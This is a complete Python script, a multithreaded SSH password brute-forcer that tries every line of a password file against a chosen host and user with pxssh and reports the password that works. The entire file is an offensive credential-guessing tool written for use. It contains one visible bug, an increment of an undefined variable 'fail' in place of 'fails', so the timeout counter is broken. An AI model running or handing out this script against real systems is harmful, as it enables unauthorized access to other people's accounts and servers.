#! /usr/bin/python3

import sys, getopt, time
import pxssh
from threading import *

max_connections = 5;
connectionLock = BoundedSemaphore(value=max_connections);
found = False;
fails = 0;

def usage():
	print("\n============================================================================================");
	print("Brute force SSH user with password file");
	print("Usage:")
	print("ssh_brute.py -t target -u user -p password file");
	print("-------------")
	print("-t | --target IP|Host                         ### Host");
	print("-u | --user username	                      ### Username");
	print("-p | --password <file>                        ### Password file");
	print("============================================================================================\n");

def connect(host, user, password, release):
	global found;
	global fails;
	
	try:
		ssh = pxssh.pxssh();
		ssh.login(host, user, password);
		print("Password found: " +password);
		found = True;
	except pxssh.ExceptionPxssh as e:
		print(str(e));
		if 'read_nonblocking' in str(e):
			fail +=1;
			time.sleep(5);
			connect(host, user, password, False);
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1);
			connect(host, user, password, False);
	finally:
		if release: connectionLock.release();

def main(argv):
	if (len(argv)<1):
		print("Missing Arguments");
		usage();
		sys.exit(2);
	try:
		opts, args = getopt.getopt(argv, 'ht:u:p:', ["target=", "user=", "password="]);
	except getopt.GetoptError as err:
		print(err);
		usage();
		sys.exit(2);

	for opt, arg in opts:
		if opt == '-h':
			usage();
			sys.exit();
		elif opt in ('-t', "--target"):
			target = arg;
		elif opt in ('-u', "--user"):
			user = arg;
		elif opt in ('-p', "--password"):
			password = arg;
		else:
			print("what, how did this happen?");
	passfile = open(password, 'r');
	for line in passfile.readlines():
		if found:
			print("Password Found");
			exit(0);
		if fails > 5:
			print("Exiting: too many timeouts");
			exit(0);
		connectionLock.acquire();
		passwd=line.strip('\r').strip('\n');
		print("Trying: " + passwd);
		thrd=Thread(target=connect, args=(target, user, passwd, True));
		child=thrd.start();

if __name__ == "__main__":
	main(sys.argv[1:])
